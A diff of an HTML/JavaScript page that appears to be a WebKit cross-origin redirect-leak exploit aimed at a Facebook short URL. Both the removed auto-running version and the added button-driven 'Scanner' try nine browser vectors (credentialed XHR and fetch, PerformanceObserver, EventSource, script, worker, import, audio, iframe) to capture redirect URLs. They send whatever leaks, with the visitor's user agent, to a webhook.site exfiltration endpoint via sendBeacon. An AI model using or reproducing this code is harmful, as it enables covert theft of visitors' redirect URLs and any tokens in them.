@@ -1,170 +1,156 @@
 <!DOCTYPE html>
 <html>
-
 <head>
     <meta charset='utf-8' />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Redirect Leak Researcher - Putra Mahardika</title>
+    <title>Scanner</title>
     <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff41;
-            padding: 20px;
-            line-height: 1.4;
-        }
-
-        .container {
-            border: 1px solid #00ff41;
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px #00ff41;
-        }
-
-        h2 {
-            border-bottom: 1px solid #00ff41;
-            padding-bottom: 10px;
-            color: #fff;
-        }
-
-        .log-item {
-            margin-bottom: 5px;
-            border-left: 3px solid #444;
-            padding-left: 10px;
-            font-size: 12px;
-        }
-
-        .leak {
-            color: #ff3e3e;
-            font-weight: bold;
-            border-left: 3px solid #ff3e3e;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0.5;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
+        body { font-family: monospace; padding: 20px; color: #000; background: #fff; }
+        .input-group { margin-bottom: 20px; }
+        input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #000; box-sizing: border-box; font-family: monospace; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { padding: 10px; cursor: pointer; border: 1px solid #000; background: #fff; font-family: monospace; text-align: left; }
+        button:active { background: #eee; }
+        pre { margin-top: 20px; border: 1px solid #000; padding: 10px; min-height: 200px; white-space: pre-wrap; font-size: 12px; }
+        .leak { background: #000; color: #fff; font-weight: bold; padding: 2px; }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <h2>[!] WebKit Redirect Leak Analyser</h2>
-        <p>Target: <span id="target_display"></span></p>
-        <hr>
-        <div id="status">[*] Ready. Waiting for trigger...</div>
-        <div id="logs" style="margin-top: 20px;"></div>
+
+    <div class="input-group">
+        <input type="text" id="target" value="https://fb.com/4">
+        <input type="text" id="exfil" value="https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594">
     </div>
 
+    <div class="grid">
+        <button onclick="testXHR()">1. XHR (responseURL)</button>
+        <button onclick="testFetch()">2. Fetch (Error Msg)</button>
+        <button onclick="testPerf()">3. Performance Timing</button>
+        <button onclick="testES()">4. EventSource</button>
+        <button onclick="testScript()">5. Script Error</button>
+        <button onclick="testWorker()">6. Web Worker</button>
+        <button onclick="testImport()">7. Dynamic Import</button>
+        <button onclick="testAudio()">8. Audio Object</button>
+        <button onclick="testIframe()">9. Iframe Location</button>
+        <button onclick="clearLogs()">0. Clear Logs</button>
+    </div>
+
+    <pre id="logs"></pre>
+
     <script>
-        // CONFIGURATION
-        const CONFIG = {
-            target: 'https://fb.com/4', // Ganti dengan URL target
-            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594',       // Ganti dengan URL exfiltrasi lu
-            myOrigin: window.location.origin
-        };
+        const getT = () => document.getElementById('target').value;
+        const getE = () => document.getElementById('exfil').value;
+        const logArea = document.getElementById('logs');
 
-        document.getElementById('target_display').innerText = CONFIG.target;
-
-        function log(msg, isLeak = false) {
-            const div = document.createElement('div');
-            div.className = isLeak ? 'log-item leak' : 'log-item';
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.getElementById('logs').prepend(div);
-            console.log(msg);
+        function out(msg, isLeak = false) {
+            const span = document.createElement('span');
+            if (isLeak) span.className = 'leak';
+            span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            logArea.appendChild(span);
+            logArea.scrollTop = logArea.scrollHeight;
         }
 
-        function report(data, method) {
-            if (!data || data === CONFIG.target || data === CONFIG.myOrigin + '/') return;
-            log(`ALERT: LEAK DETECTED via ${method}!`, true);
-            log(`DATA: ${data}`, true);
-
-            // Exfil via sendBeacon (lebih stabil di iOS saat redirect/error)
-            navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
-                method: method,
-                leaked_url: data,
-                ua: navigator.userAgent
-            }));
+        function send(data, type) {
+            if (!data || data === getT()) return;
+            out(`LEAK: ${data}`, true);
+            navigator.sendBeacon(getE(), JSON.stringify({type, data, ua: navigator.userAgent}));
         }
 
-        async function startExploit() {
-            log("[*] Starting multi-vector analysis...");
+        function clearLogs() { logArea.innerText = ''; }
 
-            // --- Vector 1: Performance Resource Timing ---
-            const observer = new PerformanceObserver((list) => {
-                list.getEntries().forEach((entry) => {
-                    if (entry.name !== CONFIG.target && entry.name.startsWith('http')) {
-                        report(entry.name, 'Resource-Timing');
-                    }
+        function testXHR() {
+            out('Testing XHR...');
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', getT(), true);
+            xhr.withCredentials = true;
+            xhr.onreadystatechange = () => { if (xhr.responseURL) send(xhr.responseURL, 'XHR'); };
+            xhr.onerror = () => { send(xhr.responseURL, 'XHR-Error'); };
+            xhr.send();
+        }
+
+        function testFetch() {
+            out('Testing Fetch...');
+            fetch(getT(), { mode: 'cors', credentials: 'include' })
+                .then(r => send(r.url, 'Fetch'))
+                .catch(e => {
+                    const m = e.message.match(/(https?:\/\/[^\s]+)/);
+                    if (m) send(m[0], 'Fetch-Msg');
+                    else out('Fetch Blocked: ' + e.message);
+                });
+        }
+
+        function testPerf() {
+            out('Testing PerformanceObserver...');
+            const obs = new PerformanceObserver((l) => {
+                l.getEntries().forEach(e => {
+                    if (e.name !== getT() && e.name.startsWith('http')) send(e.name, 'Perf');
                 });
             });
-            observer.observe({ entryTypes: ['resource'] });
+            obs.observe({ entryTypes: ['resource'] });
+            fetch(getT(), { mode: 'no-cors' });
+        }
 
-            // --- Vector 2: XMLHttpRequest State Check ---
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', CONFIG.target, true);
-            xhr.withCredentials = true;
-            xhr.onreadystatechange = () => {
-                if (xhr.responseURL && xhr.responseURL !== CONFIG.target) {
-                    report(xhr.responseURL, 'XHR-ResponseURL');
-                }
-            };
-            xhr.onerror = () => {
-                log("[*] XHR Error triggered (CORS block)");
-                report(xhr.responseURL, 'XHR-Error-State');
-            };
-            xhr.send();
-
-            // --- Vector 3: EventSource URL Quirks ---
+        function testES() {
+            out('Testing EventSource...');
             try {
-                const es = new EventSource(CONFIG.target);
+                const es = new EventSource(getT());
                 setTimeout(() => {
-                    if (es.url && es.url !== CONFIG.target) {
-                        report(es.url, 'EventSource-URL');
-                    }
+                    send(es.url, 'EventSource');
                     es.close();
-                }, 2000);
-            } catch (e) { }
+                }, 1500);
+            } catch(e) { out(e.message); }
+        }
 
-            // --- Vector 4: Fetch Rejection Analysis ---
-            fetch(CONFIG.target, { mode: 'cors', credentials: 'include' })
-                .then(r => report(r.url, 'Fetch-Resolved'))
-                .catch(err => {
-                    log(`[*] Fetch Rejected: ${err.message}`);
-                    const urlMatch = err.message.match(/(https?:\/\/[^\s]+)/);
-                    if (urlMatch) report(urlMatch[0], 'Fetch-Error-Message');
-                });
-
-            // --- Vector 5: Script Tag Global Error ---
-            window.onerror = (msg, src) => {
-                if (src && src !== CONFIG.target) {
-                    report(src, 'Window-OnError');
-                }
-                return true;
+        function testScript() {
+            out('Testing Script Tag...');
+            const handler = (m, s) => {
+                send(s, 'Script-Error');
+                window.removeEventListener('error', handler);
             };
+            window.addEventListener('error', handler);
             const s = document.createElement('script');
-            s.src = CONFIG.target;
+            s.src = getT();
             document.body.appendChild(s);
         }
 
-        // Trigger using requestAnimationFrame for better timing on iOS
-        window.onload = () => {
-            requestAnimationFrame(() => {
-                document.getElementById('status').innerText = "[+] Running...";
-                startExploit();
+        function testWorker() {
+            out('Testing Worker...');
+            try {
+                const w = new Worker(getT());
+                w.onerror = (e) => { send(e.filename, 'Worker'); };
+            } catch (e) {
+                const m = e.message.match(/(https?:\/\/[^\s]+)/);
+                if (m) send(m[0], 'Worker-Catch');
+            }
+        }
+
+        function testImport() {
+            out('Testing Dynamic Import...');
+            import(getT()).catch(e => {
+                const m = e.message.match(/(https?:\/\/[^\s]+)/);
+                if (m) send(m[0], 'Import-Leak');
+                else out('Import Error: ' + e.message);
             });
-        };
+        }
+
+        function testAudio() {
+            out('Testing Audio...');
+            const a = new Audio();
+            a.onerror = () => { send(a.src, 'Audio-Src-Error'); };
+            a.src = getT();
+        }
+
+        function testIframe() {
+            out('Testing Iframe...');
+            const f = document.createElement('iframe');
+            f.style.display = 'none';
+            f.src = getT();
+            f.onload = () => {
+                try { out('Iframe URL: ' + f.contentWindow.location.href); } 
+                catch(e) { out('Iframe SOP Blocked (Expected)'); }
+            };
+            document.body.appendChild(f);
+        }
     </script>
 </body>
-
 </html>
